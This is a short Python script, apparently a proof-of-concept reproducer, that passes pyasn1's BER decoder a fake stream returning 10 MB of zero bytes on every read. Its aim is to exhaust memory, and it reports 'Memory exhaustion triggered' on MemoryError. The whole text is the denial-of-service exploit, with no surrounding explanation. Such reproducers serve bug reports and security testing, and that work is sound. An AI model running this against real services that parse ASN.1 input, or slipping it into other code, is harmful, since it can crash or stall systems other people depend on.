from pyasn1.codec.ber import decoder
import io

# Create a stream that reports unlimited data
class LargeStream:
    def read(self, size=-1):
        # Return a huge amount of data
        return b'\x00' * (10 * 1024 * 1024)  # 10MB each call

    def tell(self):
        return 0

    def seek(self, pos, whence=0):
        pass

    def truncate(self):
        pass

    def write(self, data):
        return len(data)

try:
    # This will attempt to allocate all stream data into memory
    stream = LargeStream()
    decoder.decode(stream)
except MemoryError:
    print('Memory exhaustion triggered')
